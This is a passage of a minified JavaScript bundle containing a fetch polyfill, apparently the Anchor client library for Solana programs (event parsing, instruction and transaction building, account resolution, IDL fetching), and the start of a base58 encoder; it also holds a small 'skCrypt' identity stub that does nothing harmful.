                    (e = new f()),
                    t
                      .replace(/\r?\n[\t ]+/g, " ")
                      .split(/\r?\n/)
                      .forEach(function (t) {
                        var n = t.split(":"),
                          r = n.shift().trim();
                        if (r) {
                          var o = n.join(":").trim();
                          e.append(r, o);
                        }
                      }),
                    e),
                };
              n.url =
                "responseURL" in a
                  ? a.responseURL
                  : n.headers.get("X-Request-URL");
              var o = "response" in a ? a.response : a.responseText;
              r(new A(o, n));
            }),
              (a.onerror = function () {
                i(new TypeError("Network request failed"));
              }),
              (a.ontimeout = function () {
                i(new TypeError("Network request failed"));
              }),
              (a.onabort = function () {
                i(new t.DOMException("Aborted", "AbortError"));
              }),
              a.open(s.method, s.url, !0),
              "include" === s.credentials
                ? (a.withCredentials = !0)
                : "omit" === s.credentials && (a.withCredentials = !1),
              "responseType" in a && o && (a.responseType = "blob"),
              s.headers.forEach(function (t, e) {
                a.setRequestHeader(e, t);
              }),
              s.signal &&
                (s.signal.addEventListener("abort", u),
                (a.onreadystatechange = function () {
                  4 === a.readyState &&
                    s.signal.removeEventListener("abort", u);
                })),
              a.send(void 0 === s._bodyInit ? null : s._bodyInit);
          });
        }
        return (
          (I.polyfill = !0),
          n.fetch ||
            ((n.fetch = I), (n.Headers = f), (n.Request = b), (n.Response = A)),
          (t.Headers = f),
          (t.Request = b),
          (t.Response = A),
          (t.fetch = I),
          Object.defineProperty(t, "__esModule", { value: !0 }),
          t
        );
      })({}),
      (o.fetch.ponyfill = !0),
      delete o.fetch.polyfill;
    var i = o;
    ((e = i.fetch).default = i.fetch),
      (e.fetch = i.fetch),
      (e.Headers = i.Headers),
      (e.Request = i.Request),
      (e.Response = i.Response),
      (t.exports = e);
  })(pm, pm.exports),
    zl.rustEnum(
      [
        zl.struct([], "uninitialized"),
        zl.struct([zl.option(zl.publicKey(), "authorityAddress")], "buffer"),
        zl.struct([zl.publicKey("programdataAddress")], "program"),
        zl.struct(
          [
            zl.u64("slot"),
            zl.option(zl.publicKey(), "upgradeAuthorityAddress"),
          ],
          "programData"
        ),
      ],
      void 0,
      zl.u32()
    );
  const mm = "Program log: ",
    gm = "Program data: ";
  class ym {
    constructor(t, e, n) {
      (this._programId = t),
        (this._provider = e),
        (this._eventParser = new wm(t, n)),
        (this._eventCallbacks = new Map()),
        (this._eventListeners = new Map()),
        (this._listenerIdCount = 0);
    }
    addEventListener(t, e, n) {
      var r;
      let o = this._listenerIdCount;
      return (
        (this._listenerIdCount += 1),
        this._eventListeners.has(t) || this._eventListeners.set(t, []),
        this._eventListeners.set(
          t,
          (null !== (r = this._eventListeners.get(t)) && void 0 !== r
            ? r
            : []
          ).concat(o)
        ),
        this._eventCallbacks.set(o, [t, e]),
        void 0 !== this._onLogsSubscriptionId ||
          (this._onLogsSubscriptionId = this._provider.connection.onLogs(
            this._programId,
            (t, e) => {
              if (!t.err)
                for (const n of this._eventParser.parseLogs(t.logs)) {
                  const r = this._eventListeners.get(n.name);
                  r &&
                    r.forEach((r) => {
                      const o = this._eventCallbacks.get(r);
                      if (o) {
                        const [, r] = o;
                        r(n.data, e.slot, t.signature);
                      }
                    });
                }
            },
            n
          )),
        o
      );
    }
    async removeEventListener(t) {
      const e = this._eventCallbacks.get(t);
      if (!e) throw new Error(`Event listener ${t} doesn't exist!`);
      const [n] = e;
      let r = this._eventListeners.get(n);
      if (!r) throw new Error(`Event listeners don't exist for ${n}!`);
      if (
        (this._eventCallbacks.delete(t),
        (r = r.filter((e) => e !== t)),
        this._eventListeners.set(n, r),
        0 === r.length && this._eventListeners.delete(n),
        0 === this._eventCallbacks.size)
      ) {
        if (0 !== this._eventListeners.size)
          throw new Error(
            `Expected event listeners size to be 0 but got ${this._eventListeners.size}`
          );
        void 0 !== this._onLogsSubscriptionId &&
          (await this._provider.connection.removeOnLogsListener(
            this._onLogsSubscriptionId
          ),
          (this._onLogsSubscriptionId = void 0));
      }
    }
  }
  class wm {
    constructor(t, e) {
      (this.coder = e), (this.programId = t);
    }
    *parseLogs(t, e = !1) {
      const n = new vm(t),
        r = new bm();
      let o = n.next();
      for (; null !== o; ) {
        let [t, i, s] = this.handleLog(r, o, e);
        t && (yield t), i && r.push(i), s && r.pop(), (o = n.next());
      }
    }
    handleLog(t, e, n) {
      return t.stack.length > 0 && t.program() === this.programId.toString()
        ? this.handleProgramLog(e, n)
        : [null, ...this.handleSystemLog(e)];
    }
    handleProgramLog(t, e) {
      if (t.startsWith(mm) || t.startsWith(gm)) {
        const n = t.startsWith(mm) ? t.slice(13) : t.slice(14),
          r = this.coder.events.decode(n);
        if (e && null === r) throw new Error(`Unable to decode event ${n}`);
        return [r, null, !1];
      }
      return [null, ...this.handleSystemLog(t)];
    }
    handleSystemLog(t) {
      const e = t.split(":")[0];
      return null !== e.match(/^Program (.*) success/g)
        ? [null, !0]
        : e.startsWith(`Program ${this.programId.toString()} invoke`)
        ? [this.programId.toString(), !1]
        : e.includes("invoke")
        ? ["cpi", !1]
        : [null, !1];
    }
  }
  class bm {
    constructor() {
      this.stack = [];
    }
    program() {
      if (!this.stack.length)
        throw new Error("Expected the stack to have elements");
      return this.stack[this.stack.length - 1];
    }
    push(t) {
      this.stack.push(t);
    }
    pop() {
      if (!this.stack.length)
        throw new Error("Expected the stack to have elements");
      this.stack.pop();
    }
  }
  class vm {
    constructor(t) {
      this.logs = t;
    }
    next() {
      if (0 === this.logs.length) return null;
      let t = this.logs[0];
      return (this.logs = this.logs.slice(1)), t;
    }
  }
  function Am(t, e) {
    var n, r;
    let o = {};
    const i = t.args ? t.args.length : 0;
    if (e.length > i) {
      if (e.length !== i + 1)
        throw new Error(
          `provided too many arguments ${e} to instruction ${
            null == t ? void 0 : t.name
          } expecting: ${
            null !==
              (r =
                null === (n = t.args) || void 0 === n
                  ? void 0
                  : n.map((t) => t.name)) && void 0 !== r
              ? r
              : []
          }`
        );
      o = e.pop();
    }
    return [e, o];
  }
  class km {
    static build(t, e, n) {
      if ("_inner" === t.name) throw new Sp("the _inner name is reserved");
      const r = (...o) => {
        const [i, s] = Am(t, [...o]);
        yf(t.accounts, s.accounts), (function () {})(t, ...o);
        const a = r.accounts(s.accounts);
        return (
          void 0 !== s.remainingAccounts && a.push(...s.remainingAccounts),
          Ip("debug-logs"),
          new ws({ keys: a, programId: n, data: e(t.name, gf(t, ...i)) })
        );
      };
      return (
        (r.accounts = (e) => km.accountsArray(e, t.accounts, n, t.name)), r
      );
    }
    static accountsArray(t, e, n, r) {
      return t
        ? e
            .map((e) => {
              if (hf(e)) {
                const o = t[e.name];
                return km.accountsArray(o, e.accounts, n, r).flat();
              }
              let o;
              try {
                o = wf(t[e.name]);
              } catch (s) {
                throw new Error(
                  `Wrong input type for account "${
                    e.name
                  }" in the instruction accounts object${
                    void 0 !== r ? ' for instruction "' + r + '"' : ""
                  }. Expected PublicKey or string.`
                );
              }
              const i = e.optional && o.equals(n);
              return {
                pubkey: o,
                isWritable: Boolean(e.writable && !i),
                isSigner: Boolean(e.signer && !i),
              };
            })
            .flat()
        : [];
    }
  }
  class Im {
    static build(t, e) {
      return (...n) => {
        var r, o, i;
        const [, s] = Am(t, [...n]),
          a = new bs();
        if (s.preInstructions && s.instructions)
          throw new Error("instructions is deprecated, use preInstructions");
        return (
          null === (r = s.preInstructions) || void 0 === r
            ? void 0
            : r.forEach((t) => a.add(t)),
          null === (o = s.instructions) ||
            void 0 === o ||
            o.forEach((t) => a.add(t)),
          a.add(e(...n)),
          null === (i = s.postInstructions) ||
            void 0 === i ||
            i.forEach((t) => a.add(t)),
          a
        );
      };
    }
  }
  class Sm {
    static build(t, e, n, r) {
      return async (...o) => {
        var i;
        const s = e(...o),
          [, a] = Am(t, [...o]);
        if (void 0 === r.sendAndConfirm)
          throw new Error(
            "This function requires 'Provider.sendAndConfirm' to be implemented."
          );
        try {
          return await r.sendAndConfirm(
            s,
            null !== (i = a.signers) && void 0 !== i ? i : [],
            a.options
          );
        } catch (u) {
          throw Bp(u, n);
        }
      };
    }
  }
  class _m {
    static build(t, e, n, r) {
      var o;
      return (null !== (o = t.accounts) && void 0 !== o ? o : []).reduce(
        (o, i) => ((o[i.name] = new Tm(t, i, n, r, e)), o),
        {}
      );
    }
  }
  class Tm {
    get size() {
      return this._size;
    }
    get programId() {
      return this._programId;
    }
    get provider() {
      return this._provider;
    }
    get coder() {
      return this._coder;
    }
    constructor(t, e, n, r, o) {
      (this._idlAccount = e),
        (this._programId = n),
        (this._provider = null != r ? r : Jf()),
        (this._coder = null != o ? o : new Dp(t)),
        (this._size = this._coder.accounts.size(e.name));
    }
    async fetchNullable(t, e) {
      const { data: n } = await this.fetchNullableAndContext(t, e);
      return n;
    }
    async fetchNullableAndContext(t, e) {
      const n = await this.getAccountInfoAndContext(t, e),
        { value: r, context: o } = n;
      return {
        data:
          r && 0 !== r.data.length
            ? this._coder.accounts.decode(this._idlAccount.name, r.data)
            : null,
        context: o,
      };
    }
    async fetch(t, e) {
      const { data: n } = await this.fetchNullableAndContext(t, e);
      if (null === n)
        throw new Error(
          `Account does not exist or has no data ${t.toString()}`
        );
      return n;
    }
    async fetchAndContext(t, e) {
      const { data: n, context: r } = await this.fetchNullableAndContext(t, e);
      if (null === n) throw new Error(`Account does not exist ${t.toString()}`);
      return { data: n, context: r };
    }
    async fetchMultiple(t, e) {
      return (await this.fetchMultipleAndContext(t, e)).map((t) =>
        t ? t.data : null
      );
    }
    async fetchMultipleAndContext(t, e) {
      return (
        await qf(
          this._provider.connection,
          t.map((t) => wf(t)),
          e
        )
      ).map((t) => {
        if (null == t) return null;
        const { account: e, context: n } = t;
        return {
          data: this._coder.accounts.decode(this._idlAccount.name, e.data),
          context: n,
        };
      });
    }
    async all(t) {
      const e = this.coder.accounts.memcmp(
          this._idlAccount.name,
          t instanceof ct ? t : void 0
        ),
        n = [];
      return (
        null != (null == e ? void 0 : e.offset) &&
          null != (null == e ? void 0 : e.bytes) &&
          n.push({ memcmp: { offset: e.offset, bytes: e.bytes } }),
        null != (null == e ? void 0 : e.dataSize) &&
          n.push({ dataSize: e.dataSize }),
        (
          await this._provider.connection.getProgramAccounts(this._programId, {
            commitment: this._provider.connection.commitment,
            filters: [...n, ...(Array.isArray(t) ? t : [])],
          })
        ).map(({ pubkey: t, account: e }) => ({
          publicKey: t,
          account: this._coder.accounts.decode(this._idlAccount.name, e.data),
        }))
      );
    }
    subscribe(t, e) {
      const n = Cm.get(t.toString());
      if (n) return n.ee;
      const r = new cf();
      t = wf(t);
      const o = this._provider.connection.onAccountChange(
        t,
        (t) => {
          const e = this._coder.accounts.decode(this._idlAccount.name, t.data);
          r.emit("change", e);
        },
        e
      );
      return Cm.set(t.toString(), { ee: r, listener: o }), r;
    }
    async unsubscribe(t) {
      let e = Cm.get(t.toString());
      if (!e) return void 0, void 0;
      Cm &&
        (await this._provider.connection
          .removeAccountChangeListener(e.listener)
          .then(() => {
            Cm.delete(t.toString());
          })
          .catch(console.error));
    }
    async createInstruction(t, e) {
      const n = this.size;
      if (void 0 === this._provider.publicKey)
        throw new Error(
          "This function requires the Provider interface implementor to have a 'publicKey' field."
        );
      return Fs.createAccount({
        fromPubkey: this._provider.publicKey,
        newAccountPubkey: t.publicKey,
        space: null != e ? e : n,
        lamports:
          await this._provider.connection.getMinimumBalanceForRentExemption(
            null != e ? e : n
          ),
        programId: this._programId,
      });
    }
    async getAccountInfo(t, e) {
      return await this._provider.connection.getAccountInfo(wf(t), e);
    }
    async getAccountInfoAndContext(t, e) {
      return await this._provider.connection.getAccountInfoAndContext(wf(t), e);
    }
  }
  const Cm = new Map();
  class Bm {
    static build(t, e, n, r, o, i, s) {
      return async (...a) => {
        var u;
        const c = e(...a),
          [, l] = Am(t, [...a]);
        let d;
        if (void 0 === r.simulate)
          throw new Error(
            "This function requires 'Provider.simulate' to be implemented."
          );
        try {
          d = await r.simulate(
            c,
            l.signers,
            null === (u = l.options) || void 0 === u ? void 0 : u.commitment
          );
        } catch (p) {
          throw Bp(p, n);
        }
        if (void 0 === d) throw new Error("Unable to simulate transaction");
        const f = d.logs;
        if (!f) throw new Error("Simulated logs not found");
        const h = [];
        if (s.events) {
          let t = new wm(i, o);
          for (const e of t.parseLogs(f)) h.push(e);
        }
        return { events: h, raw: f };
      };
    }
  }
  function Em(t) {
    return new Rm(
      sm(8),
      (t) => Mm.fromBuffer(t),
      (t) => t.toBuffer(),
      t
    );
  }
  function xm(t) {
    return new Rm(
      sm(32),
      (t) => new Xi(t),
      (t) => t.toBuffer(),
      t
    );
  }
  function Pm(t, e) {
    return new Om(t, e);
  }
  class Rm extends qp {
    constructor(t, e, n, r) {
      super(t.span, r),
        (this.layout = t),
        (this.decoder = e),
        (this.encoder = n);
    }
    decode(t, e) {
      return this.decoder(this.layout.decode(t, e));
    }
    encode(t, e, n) {
      return this.layout.encode(this.encoder(t), e, n);
    }
    getSpan(t, e) {
      return this.layout.getSpan(t, e);
    }
  }
  class Om extends qp {
    constructor(t, e) {
      super(-1, e), (this.layout = t), (this.discriminator = nm());
    }
    encode(t, e, n = 0) {
      return null == t
        ? this.layout.span + this.discriminator.encode(0, e, n)
        : (this.discriminator.encode(1, e, n),
          this.layout.encode(t, e, n + 4) + 4);
    }
    decode(t, e = 0) {
      const n = this.discriminator.decode(t, e);
      if (0 === n) return null;
      if (1 === n) return this.layout.decode(t, e + 4);
      throw new Error("Invalid coption " + this.layout.property);
    }
    getSpan(t, e = 0) {
      return this.layout.getSpan(t, e + 4) + 4;
    }
  }
  class Mm extends Zn {
    toBuffer() {
      const t = super.toArray().reverse(),
        e = ct.from(t);
      if (8 === e.length) return e;
      if (e.length >= 8) throw new Error("u64 too large");
      const n = ct.alloc(8);
      return e.copy(n), n;
    }
    static fromBuffer(t) {
      if (8 !== t.length) throw new Error(`Invalid buffer length: ${t.length}`);
      return new Mm(
        [...t]
          .reverse()
          .map((t) => `00${t.toString(16)}`.slice(-2))
          .join(""),
        16
      );
    }
  }
  const Lm = om([
    xm("mint"),
    xm("owner"),
    Em("amount"),
    Pm(xm(), "delegate"),
    (() => {
      const t = im(((t) => new Kp(1, t))("discriminator"), null, "state");
      return (
        t.addVariant(0, om([]), "uninitialized"),
        t.addVariant(1, om([]), "initialized"),
        t.addVariant(2, om([]), "frozen"),
        t
      );
    })(),
    Pm(Em(), "isNative"),
    Em("delegatedAmount"),
    Pm(xm(), "closeAuthority"),
  ]);
  class Nm {
    constructor(t, e, n, r, o, i, s, a) {
      (this._args = t),
        (this._accounts = e),
        (this._provider = n),
        (this._programId = r),
        (this._idlIx = o),
        (this._idlTypes = s),
        (this._customResolver = a),
        (this._accountStore = new Dm(n, i, r));
    }
    args(t) {
      this._args = t;
    }
    async resolve() {
      this.resolveEventCpi(this._idlIx.accounts),
        this.resolveConst(this._idlIx.accounts);
      let t = 0;
      for (
        ;
        (await this.resolvePdasAndRelations(this._idlIx.accounts)) +
          (await this.resolveCustom()) >
        0;

      )
        if ((t++, 16 === t)) {
          const t = (e) =>
              hf(e)
                ? e.accounts.some(t)
                : !!(e.address || e.pda || e.relations),
            e = (t, n = [], r = []) => {
              for (const o of t)
                hf(o)
                  ? r.push(...e(o.accounts, [...n, o.name]))
                  : r.push([...n, o.name]);
              return r;
            },
            n = this._idlIx.accounts.filter(t),
            r = e(n)
              .filter((t) => !this.get(t))
              .map((t) => t.reduce((t, e) => t + "." + e))
              .map((t) => `\`${t}\``)
              .join(", ");
          throw new Error(
            [
              "Reached maximum depth for account resolution.",
              `Unresolved accounts: ${r}`,
            ].join(" ")
          );
        }
    }
    resolveOptionals(t) {
      Object.assign(
        this._accounts,
        this.resolveOptionalsHelper(t, this._idlIx.accounts)
      );
    }
    get(t) {
      const e = t.reduce((t, e) => t && t[e], this._accounts);
      if (e && e.toBase58) return e;
    }
    set(t, e) {
      let n = this._accounts;
      t.forEach((r, o) => {
        var i;
        o === t.length - 1 && (n[r] = e),
          (n[r] = null !== (i = n[r]) && void 0 !== i ? i : {}),
          (n = n[r]);
      });
    }
    resolveOptionalsHelper(t, e) {
      const n = {};
      for (const r of e) {
        const e = r.name,
          o = t[e];
        void 0 !== o &&
          (qm(o)
            ? hf(r)
              ? (n[e] = this.resolveOptionalsHelper(o, r.accounts))
              : (n[e] = Wm(o))
            : null !== o
            ? (n[e] = wf(o))
            : r.optional && (n[e] = this._programId));
      }
      return n;
    }
    async resolveCustom() {
      if (this._customResolver) {
        const { accounts: t, resolved: e } = await this._customResolver({
          args: this._args,
          accounts: this._accounts,
          provider: this._provider,
          programId: this._programId,
          idlIx: this._idlIx,
        });
        return (this._accounts = t), e;
      }
      return 0;
    }
    resolveEventCpi(t, e = []) {
      for (const n in t) {
        const r = t[n];
        hf(r) && this.resolveEventCpi(r.accounts, [...e, r.name]);
        const o = +n + 1;
        if (o === t.length) return;
        const i = t[n].name,
          s = t[o].name;
        if ("eventAuthority" === i && "program" === s) {
          const t = [...e, i],
            n = [...e, s];
          return (
            this.get(t) ||
              this.set(
                t,
                Xi.findProgramAddressSync(
                  [ct.from("__event_authority")],
                  this._programId
                )[0]
              ),
            this.get(n) || this.set(n, this._programId),
            void 0
          );
        }
      }
    }
    resolveConst(t, e = []) {
      for (const n of t) {
        const t = n.name;
        if (hf(n)) this.resolveConst(n.accounts, [...e, t]);
        else {
          const r = n;
          if ((r.signer || r.address) && !this.get([...e, t])) {
            if (r.signer) {
              if (!this._provider.publicKey)
                throw new Error(
                  "This function requires the `Provider` interface implementor to have a `publicKey` field."
                );
              this.set([...e, t], this._provider.publicKey);
            }
            r.address && this.set([...e, t], wf(r.address));
          }
        }
      }
    }
    async resolvePdasAndRelations(t, e = []) {
      let n = 0;
      for (const r of t) {
        const t = r.name;
        if (hf(r))
          n += await this.resolvePdasAndRelations(r.accounts, [...e, t]);
        else {
          const o = r;
          if ((o.pda || o.relations) && !this.get([...e, t])) {
            n++;
            try {
              if (o.pda) {
                const n = await Promise.all(
                  o.pda.seeds.map((t) => this.toBuffer(t, e))
                );
                if (n.some((t) => !t)) continue;
                const r = await this.parseProgramId(o, e),
                  [i] = Xi.findProgramAddressSync(n, r);
                this.set([...e, t], i);
              }
            } catch {}
            try {
              if (o.relations) {
                const n = this.get([...e, o.relations[0]]);
                if (n) {
                  const r = await this._accountStore.fetchAccount({
                    publicKey: n,
                  });
                  this.set([...e, t], r[t]);
                }
              }
            } catch {}
          }
        }
      }
      return n;
    }
    async parseProgramId(t, e = []) {
      var n;
      if (!(null === (n = t.pda) || void 0 === n ? void 0 : n.program))
        return this._programId;
      const r = await this.toBuffer(t.pda.program, e);
      if (!r) throw new Error(`Program seed not resolved: ${t.name}`);
      return new Xi(r);
    }
    async toBuffer(t, e = []) {
      switch (t.kind) {
        case "const":
          return this.toBufferConst(t);
        case "arg":
          return await this.toBufferArg(t);
        case "account":
          return await this.toBufferAccount(t, e);
        default:
          throw new Error(`Unexpected seed: ${t}`);
      }
    }
    toBufferConst(t) {
      return this.toBufferValue("bytes", t.value);
    }
    async toBufferArg(t) {
      const [e, ...n] = t.path.split("."),
        r = this._idlIx.args.findIndex((t) => t.name === e);
      if (-1 === r) throw new Error(`Unable to find argument for seed: ${e}`);
      const o = n.reduce((t, e) => (null != t ? t : {})[e], this._args[r]);
      if (void 0 === o) return;
      const i = this.getType(this._idlIx.args[r].type, n);
      return this.toBufferValue(i, o);
    }
    async toBufferAccount(t, e = []) {
      const [n, ...r] = t.path.split("."),
        o = this.get([...e, n]);
      if (!o) return;
      if (!r.length) return this.toBufferValue("pubkey", o);
      if (!t.account)
        throw new Error(
          `Seed account is required in order to resolve type: ${t.path}`
        );
      let i = await this._accountStore.fetchAccount({
          publicKey: o,
          name: t.account,
        }),
        s = r;
      for (; s.length > 0; ) (i = i[s[0]]), (s = s.slice(1));
      if (void 0 === i) return;
      const a = this.getType({ defined: { name: t.account } }, r);
      return this.toBufferValue(a, i);
    }
    toBufferValue(t, e) {
      switch (t) {
        case "u8":
        case "i8":
          return ct.from([e]);
        case "u16":
        case "i16":
          return new Zn(e).toArrayLike(ct, "le", 2);
        case "u32":
        case "i32":
          return new Zn(e).toArrayLike(ct, "le", 4);
        case "u64":
        case "i64":
          return new Zn(e).toArrayLike(ct, "le", 8);
        case "u128":
        case "i128":
          return new Zn(e).toArrayLike(ct, "le", 16);
        case "u256":
        case "i256":
          return new Zn(e).toArrayLike(ct, "le", 32);
        case "string":
        case "bytes":
          return ct.from(e);
        case "pubkey":
          return e.toBuffer();
        default:
          if (null == t ? void 0 : t.array) return ct.from(e);
          throw new Error(`Unexpected seed type: ${t}`);
      }
    }
    getType(t, e = []) {
      var n;
      const r =
        null === (n = null == t ? void 0 : t.defined) || void 0 === n
          ? void 0
          : n.name;
      if (r) {
        if ("tokenAccount" === r)
          switch (e.at(0)) {
            case "mint":
            case "owner":
              return "pubkey";
            case "amount":
            case "delagatedAmount":
              return "u64";
            default:
              throw new Error(`Unknown token account path: ${e}`);
          }
        const t = this._idlTypes.find((t) => t.name === r);
        if (!t) throw new Error(`Type not found: ${r}`);
        const [n, ...o] = e,
          i = t.type.fields.find((t) => t.name === n);
        if (!i) throw new Error(`Field not found: ${n}`);
        return this.getType(i.type, o);
      }
      return t;
    }
  }
  class Dm {
    constructor(t, e, n) {
      (this._provider = t),
        (this._cache = new Map()),
        (this._idls = {}),
        (this._idls[n.toBase58()] = e);
    }
    async fetchAccount({ publicKey: t, name: e }) {
      const n = t.toBase58();
      if (!this._cache.has(n)) {
        const o = await this._provider.connection.getAccountInfo(t);
        if (null === o) throw new Error(`Account not found: ${n}`);
        if ("tokenAccount" === e) {
          const t = ((r = o.data), Lm.decode(r));
          this._cache.set(n, t);
        } else {
          const t = await this.getAccountsNs(o.owner);
          if (t) {
            const e = Object.values(t)[0];
            if (e) {
              const t = e.coder.accounts.decodeAny(o.data);
              this._cache.set(n, t);
            }
          }
        }
      }
      var r;
      return this._cache.get(n);
    }
    async getAccountsNs(t) {
      const e = t.toBase58();
      if (!this._idls[e]) {
        const n = await jm.fetchIdl(t, this._provider);
        if (n) {
          const t = new jm(n, this._provider);
          this._idls[e] = t.account;
        }
      }
      return this._idls[e];
    }
  }
  class Um {
    static build(t, e, n, r, o, i, s, a, u, c, l) {
      return (...d) => new zm(d, r, o, i, s, a, t, e, n, u, c, l);
    }
  }
  function qm(t) {
    return "object" == typeof t && null !== t && !("_bn" in t);
  }
  function Wm(t, e) {
    const n = {};
    for (const r in t) {
      const e = t[r];
      if (null === e)
        throw new Error(
          "Failed to resolve optionals due to IDL type mismatch with input accounts!"
        );
      n[r] = qm(e) ? Wm(e) : wf(e);
    }
    return n;
  }
  class zm {
    constructor(t, e, n, r, o, i, s, a, u, c, l, d) {
      (this._args = t),
        (this._ixFn = e),
        (this._txFn = n),
        (this._rpcFn = r),
        (this._simulateFn = o),
        (this._viewFn = i),
        (this._accounts = {}),
        (this._remainingAccounts = []),
        (this._signers = []),
        (this._preInstructions = []),
        (this._postInstructions = []),
        (this._resolveAccounts = !0),
        (this._accountsResolver = new Nm(t, this._accounts, s, a, u, c, l, d));
    }
    args(t) {
      (this._args = t), this._accountsResolver.args(t);
    }
    accounts(t) {
      return this.accountsPartial(t);
    }
    accountsPartial(t) {
      return (
        (this._resolveAccounts = !0),
        this._accountsResolver.resolveOptionals(t),
        this
      );
    }
    accountsStrict(t) {
      return (
        (this._resolveAccounts = !1),
        this._accountsResolver.resolveOptionals(t),
        this
      );
    }
    signers(t) {
      return (this._signers = this._signers.concat(t)), this;
    }
    remainingAccounts(t) {
      return (
        (this._remainingAccounts = this._remainingAccounts.concat(t)), this
      );
    }
    preInstructions(t, e = !1) {
      return (
        (this._preInstructions = e
          ? t.concat(this._preInstructions)
          : this._preInstructions.concat(t)),
        this
      );
    }
    postInstructions(t) {
      return (this._postInstructions = this._postInstructions.concat(t)), this;
    }
    async pubkeys() {
      return (
        this._resolveAccounts && (await this._accountsResolver.resolve()),
        this._accounts
      );
    }
    async instruction() {
      return (
        this._resolveAccounts && (await this._accountsResolver.resolve()),
        this._ixFn(...this._args, {
          accounts: this._accounts,
          signers: this._signers,
          remainingAccounts: this._remainingAccounts,
          preInstructions: this._preInstructions,
          postInstructions: this._postInstructions,
        })
      );
    }
    async transaction() {
      return (
        this._resolveAccounts && (await this._accountsResolver.resolve()),
        this._txFn(...this._args, {
          accounts: this._accounts,
          signers: this._signers,
          remainingAccounts: this._remainingAccounts,
          preInstructions: this._preInstructions,
          postInstructions: this._postInstructions,
        })
      );
    }
    async simulate(t) {
      return (
        this._resolveAccounts && (await this._accountsResolver.resolve()),
        this._simulateFn(...this._args, {
          accounts: this._accounts,
          signers: this._signers,
          remainingAccounts: this._remainingAccounts,
          preInstructions: this._preInstructions,
          postInstructions: this._postInstructions,
          options: t,
        })
      );
    }
    async view(t) {
      if (
        (this._resolveAccounts && (await this._accountsResolver.resolve()),
        !this._viewFn)
      )
        throw new Error(
          [
            "Method does not support views.",
            "The instruction should return a value, and its accounts must be read-only",
          ].join(" ")
        );
      return this._viewFn(...this._args, {
        accounts: this._accounts,
        signers: this._signers,
        remainingAccounts: this._remainingAccounts,
        preInstructions: this._preInstructions,
        postInstructions: this._postInstructions,
        options: t,
      });
    }
    async rpc(t) {
      return (
        this._resolveAccounts && (await this._accountsResolver.resolve()),
        this._rpcFn(...this._args, {
          accounts: this._accounts,
          signers: this._signers,
          remainingAccounts: this._remainingAccounts,
          preInstructions: this._preInstructions,
          postInstructions: this._postInstructions,
          options: t,
        })
      );
    }
    async rpcAndKeys(t) {
      return { signature: await this.rpc(t), pubkeys: await this.pubkeys() };
    }
    async prepare() {
      return {
        instruction: await this.instruction(),
        signers: this._signers,
        pubkeys: await this.pubkeys(),
      };
    }
  }
  class Km {
    static build(t, e, n, r) {
      const o = e.accounts.find((t) => t.writable),
        i = !!e.returns;
      if (o || !i) return;
      return async (...o) => {
        let i = await n(...o);
        const s = `Program return: ${t} `;
        let a = i.raw.find((t) => t.startsWith(s));
        if (!a) throw new Error("View expected return log");
        let u = ff(a.slice(s.length)),
          c = e.returns;
        if (!c) throw new Error("View expected return type");
        return Pp.fieldLayout({ type: c }, r.types).decode(u);
      };
    }
  }
  class Fm {
    static build(t, e, n, r, o) {
      const i = {},
        s = {},
        a = {},
        u = {},
        c = {},
        l = {},
        d = (function (t) {
          const e = new Map();
          return (
            t.errors &&
              t.errors.forEach((t) => {
                var n;
                let r = null !== (n = t.msg) && void 0 !== n ? n : t.name;
                e.set(t.code, r);
              }),
            e
          );
        })(t),
        f = t.accounts ? _m.build(t, e, n, r) : {};
      return (
        t.instructions.forEach((h) => {
          const p = km.build(h, (t, n) => e.instruction.encode(t, n), n),
            m = Im.build(h, p),
            g = Sm.build(h, m, d, r),
            y = Bm.build(h, m, d, r, e, n, t),
            w = Km.build(n, h, y, t),
            b = Um.build(
              r,
              n,
              h,
              p,
              m,
              g,
              y,
              w,
              f,
              t.types || [],
              null == o ? void 0 : o(h)
            ),
            v = h.name;
          (s[v] = p),
            (a[v] = m),
            (i[v] = g),
            (u[v] = y),
            (c[v] = b),
            w && (l[v] = w);
        }),
        [i, s, a, f, u, c, l]
      );
    }
  }
  class jm {
    get programId() {
      return this._programId;
    }
    get idl() {
      return this._idl;
    }
    get rawIdl() {
      return this._rawIdl;
    }
    get coder() {
      return this._coder;
    }
    get provider() {
      return this._provider;
    }
    constructor(t, e = Jf(), n, r) {
      (this._idl = (function (t) {
        const e = ["name", "path", "account", "relations", "generic"],
          n = (t) => t.split(".").map(Ml).join("."),
          r = (t) => {
            for (const o in t) {
              const i = t[o];
              e.includes(o)
                ? (t[o] = Array.isArray(i) ? i.map(n) : n(i))
                : "object" == typeof i && r(i);
            }
          },
          o = structuredClone(t);
        return r(o), o;
      })(t)),
        (this._rawIdl = t),
        (this._provider = e),
        (this._programId = wf(t.address)),
        (this._coder = null != n ? n : new Dp(this._idl)),
        (this._events = new ym(this._programId, e, this._coder));
      const [o, i, s, a, u, c, l] = Fm.build(
        this._idl,
        this._coder,
        this._programId,
        e,
        r
      );
      (this.rpc = o),
        (this.instruction = i),
        (this.transaction = s),
        (this.account = a),
        (this.simulate = u),
        (this.methods = c),
        (this.views = l);
    }
    static async at(t, e) {
      const n = wf(t),
        r = await jm.fetchIdl(n, e);
      if (!r) throw new Error(`IDL not found for program: ${t.toString()}`);
      return new jm(r, e);
    }
    static async fetchIdl(t, e) {
      e = null != e ? e : Jf();
      const n = wf(t),
        r = await (async function (t) {
          const e = (await Xi.findProgramAddress([], t))[0];
          return await Xi.createWithSeed(e, "anchor:idl", t);
        })(n),
        o = await e.connection.getAccountInfo(r);
      if (!o) return null;
      let i = ((s = o.data.slice(8)), pf.decode(s));
      var s;
      const a = sf(i.data);
      return JSON.parse(((u = a), new TextDecoder("utf-8").decode(u)));
      var u;
    }
    addEventListener(t, e, n) {
      return this._events.addEventListener(t, e, n);
    }
    async removeEventListener(t) {
      return await this._events.removeEventListener(t);
    }
  }
  new Xi("11111111111111111111111111111111"),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const Gm = (function (t) {
    if (t.length >= 255) throw new TypeError("Alphabet too long");
    const e = new Uint8Array(256);
    for (let a = 0; a < e.length; a++) e[a] = 255;
    for (let a = 0; a < t.length; a++) {
      const n = t.charAt(a),
        r = n.charCodeAt(0);
      if (255 !== e[r]) throw new TypeError(n + " is ambiguous");
      e[r] = a;
    }
    const n = t.length,
      r = t.charAt(0),
      o = Math.log(n) / Math.log(256),
      i = Math.log(256) / Math.log(n);
    function s(t) {
      if ("string" != typeof t) throw new TypeError("Expected String");
      if (0 === t.length) return new Uint8Array();
      let i = 0,
        s = 0,
        a = 0;
